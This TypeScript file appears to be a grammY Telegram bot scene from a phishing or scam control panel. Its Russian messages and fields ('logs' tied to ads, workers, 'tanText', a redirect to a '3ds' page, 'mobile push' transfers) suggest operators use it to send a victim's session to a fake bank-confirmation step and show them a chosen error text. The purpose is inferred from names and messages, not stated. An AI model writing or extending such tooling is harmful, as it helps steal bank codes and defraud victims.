import {Context} from "@/database/models/context";
import {Scene} from "grammy-scenes";
import {Composer, InlineKeyboard} from "grammy";
import {logsRepository, userRepository} from "@/database";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {notificationBot} from "@/utils/bot";
import {getUsername} from "@/helpers/getUsername";

export const scene = new Scene<Context>('codeRedirectScene')
export const composer = new Composer<Context>()
const regex = /log redirect code1.0 (?<id>\d+)/gmi
composer.callbackQuery(regex, handler)

async function handler(ctx: Context)  {
    const match = regex.exec(ctx.callbackQuery.data)
    const id = match.groups.id
    await ctx.scenes.enter('codeRedirectScene', {
        id
    })
}

scene.always().callbackQuery('cancel codeRedirectScene', async (ctx) => {
    await deleteAllMessages(ctx.session.deleteMessage, ctx)
    ctx.scene.exit()
})

scene.do(async (ctx) => {
    ctx.session.logId = Number(ctx.scene.opts.arg.id)

    const msg = await ctx.reply("<b>⁉️ Введи ошибку после ввода кода:</b>", {
        reply_markup:  new InlineKeyboard()
            .text('Отмена', 'cancel codeRedirectScene')
    })
    ctx.session.deleteMessage = []
    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})

scene.wait().hears(/.+/,async ctx => {
    const log = await logsRepository.findOne({
        relations: ['ad', 'ad.author', 'ad.acceptedLog'],
        where: {id: ctx.session.logId}
    })

    ctx.session.text = ctx.msg.text
    log.question = ''
    log.tanText = ctx.session.text.replaceAll('\n', '<br/>')
    log.redirectTo = 'lonelypups3ds'

    await logsRepository.save(log)
    await deleteAllMessages(ctx.session.deleteMessage, ctx)
    ctx.scene.exit()
    await ctx.reply(`
👍 Запрос на редирект "MOBILE PUSH 1.0" успешно отправлен
`.replace(`\n`, ''), {
        reply_markup: {
            inline_keyboard: [
                [{text: "Закрыть", callback_data: 'deleteThisMessage'}]
            ]
        }
    })
    await notificationBot.api.sendMessage(log.ad?.author?.tgId, `🔔 ${await getUsername(log.ad.acceptedLog)} Выполнил перевод на mobile push`, {
        reply_to_message_id: log.msgWorkerId
    })
})